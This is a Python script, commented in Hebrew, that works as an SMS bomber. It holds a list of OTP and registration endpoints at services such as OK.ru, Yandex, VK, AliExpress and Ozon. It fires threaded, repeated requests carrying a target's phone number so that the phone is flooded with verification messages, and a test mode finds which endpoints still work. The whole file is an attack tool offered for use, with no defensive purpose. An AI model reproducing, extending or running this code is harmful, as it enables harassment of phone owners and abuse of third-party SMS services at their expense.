#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# bomber.py - יורה קודי OTP מהאתרים עצמם. בחינם, בלי סים.

import re, sys, threading, time
import requests

TIMEOUT = 15
UA = ("Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")

# ============================================================
#  הרשימה. הוסף כאן אתרים שמצאת.
#  {p} = +972501234567     {i} = 972501234567
#  {n} = 0501234567        {l} = 501234567
#  kind: "json" / "form" / "query"
# ============================================================
ENDPOINTS = [
    ("OK.ru",        "POST", "https://www.ok.ru/registration/sendSmsCode",     "form", {"phone": "{i}"}),
    ("Yandex",       "POST", "https://passport.yandex.ru/registration/sms/send", "form", {"phone": "{i}"}),
    ("VK",           "POST", "https://api.vk.com/method/auth.signup",          "form", {"phone": "{i}", "v": "5.199"}),
    ("AliExpress",   "POST", "https://login.aliexpress.com/smsCodeSend.htm",   "form", {"phone": "{i}"}),
    ("Wildberries",  "POST", "https://www.wildberries.ru/webapi/sms/send",     "form", {"phone": "{i}"}),
    ("Ozon",         "POST", "https://www.ozon.ru/api/composer-api.bx/sms/send", "json", {"phone": "{p}"}),
    ("Odnoklassniki","POST", "https://www.ok.ru/registration/sendSmsCode",     "form", {"phone": "{i}"}),
    ("Sbermarket",   "POST", "https://sbermarket.ru/api/sms/send",             "json", {"phone": "{p}"}),
    ("Dodo",         "POST", "https://api.dodopizza.ru/sms/send",              "json", {"phone": "{i}"}),
    ("Kari",         "POST", "https://www.kari.com/api/sms/send",              "json", {"phone": "{i}"}),
]


def variants(num):
    d = re.sub(r"\D", "", num)
    if d.startswith("972"):
        intl, local = d, "0" + d[3:]
    elif d.startswith("0"):
        intl, local = "972" + d[1:], d
    else:
        intl, local = d, d
    return {"p": "+" + intl, "i": intl, "n": local, "l": local.lstrip("0")}


def fill(payload, v):
    out = {}
    for k, val in payload.items():
        try:
            out[k] = val.format(**v)
        except Exception:
            out[k] = val
    return out


def fire(method, url, kind, payload, v):
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*"}
    try:
        if kind == "json":
            h["Content-Type"] = "application/json"
            return requests.request(method, url, json=fill(payload, v), headers=h, timeout=TIMEOUT)
        if kind == "form":
            return requests.request(method, url, data=fill(payload, v), headers=h, timeout=TIMEOUT)
        if kind == "query":
            return requests.request(method, url, params=fill(payload, v), headers=h, timeout=TIMEOUT)
        return requests.request(method, url, headers=h, timeout=TIMEOUT)
    except Exception as e:
        return e


def test(number):
    v = variants(number)
    print(f"בודק {len(ENDPOINTS)} אתרים עם המספר {v['p']} ...\n")
    working = []
    lock = threading.Lock()

    def one(item):
        name, method, url, kind, payload = item
        r = fire(method, url, kind, payload, v)
        if isinstance(r, Exception):
            line = f"  {name:<14} שגיאה: {type(r).__name__}"
        else:
            snippet = r.text[:70].replace("\n", " ")
            line = f"  {name:<14} {r.status_code}  {snippet}"
            if r.status_code < 400:
                with lock:
                    working.append(item)
        print(line)

    ts = [threading.Thread(target=one, args=(e,)) for e in ENDPOINTS]
    for t in ts:
        t.start()
    for t in ts:
        t.join()

    print(f"\n{len(working)} אתרים הגיבו בהצלחה.")
    print("אם קיבלת SMS - זה עובד. אחרת תוסיף אתרים אחרים לרשימה.")
    return working


def bomb(number, rounds=1, delay=0.4):
    v = variants(number)
    total = len(ENDPOINTS) * rounds
    print(f"יורה {total} בקשות ({len(ENDPOINTS)} אתרים x {rounds} סבבים) ל-{v['p']}\n")

    ok = 0
    lock = threading.Lock()

    def one(item):
        nonlocal ok
        name, method, url, kind, payload = item
        r = fire(method, url, kind, payload, v)
        if not isinstance(r, Exception) and r.status_code < 400:
            with lock:
                ok += 1
                print(f"  [{ok}] {name}")

    for rd in range(rounds):
        print(f"--- סבב {rd + 1}/{rounds} ---")
        ts = [threading.Thread(target=one, args=(e,)) for e in ENDPOINTS]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        if rd < rounds - 1:
            time.sleep(delay)

    print(f"\nנשלחו {ok} בקשות מוצלחות.")
    print("בדוק את הטלפון - כל בקשה מוצלחת = SMS נכנס.")


def main():
    if len(sys.argv) < 2:
        print("שימוש:")
        print("  python bomber.py test +972501234567      בדיקה - איזה אתרים עובדים")
        print("  python bomber.py bomb +972501234567 3    שליחה - 3 סבבים")
        return
    mode = sys.argv[1]
    number = sys.argv[2] if len(sys.argv) > 2 else ""
    if not number:
        number = input("מספר טלפון: ").strip()
    if mode == "test":
        test(number)
    else:
        rounds = int(sys.argv[3]) if len(sys.argv) > 3 else 1
        bomb(number, rounds)


if __name__ == "__main__":
    main()
